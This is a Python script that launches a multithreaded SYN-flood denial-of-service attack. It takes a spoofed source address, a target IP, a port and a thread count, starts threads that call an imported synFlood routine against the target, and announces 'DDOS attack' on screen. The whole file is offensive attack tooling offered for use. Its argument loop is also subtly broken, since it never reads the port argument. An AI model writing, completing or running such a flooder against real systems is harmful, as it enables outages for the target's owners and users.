import sys
from time import sleep

from mythread import MyThread
from SYNFlood import synFlood
def main():
	exitIt=False
	threads=[]
	sourceIp="10.0.0.1"
	destIp="192.168.43.1"
	port=33455
	numberOfThreads=5
	if len(sys.argv)<5:
		pass
	else:
		for i in range(4):
			if i==1:
				sourceIp=sys.argv[1]
			elif i==2:
				destIp=sys.argv[2]
			elif i==3:
                                try:
                                        numberOfThreads=int(sys.argv[3])
                                except:
                                        print("Error parsing thread number")
			elif i==4:
                                try:
                                        port=int(sys.argv[4])
                                except:
                                        print("Error parsing port number")
	for i in range(numberOfThreads):
		thread=MyThread(synFlood,(sourceIp,destIp,port),i,"thread-"+str(i))
		threads.append(thread)
	print("\nDDOS attack "+destIp+":"+str(port)+"\n")
	for i in range(len(threads)):
		threads[i].start()
		# threads[i].join()
	# print("End of attack")
	while exitIt==False:
		try:
			# print("waiting")
			sleep(0.1)
		except KeyboardInterrupt:
                        confirmation=input("y/n?\n")
                        #print(confirmation)
                        if confirmation=="y":
                                exitIt=True
                        elif confirmation=="n":
                                pass
                        else:
                                pass
	for i in range(len(threads)):
		threads[i].stop()

if __name__=='__main__':
	main()
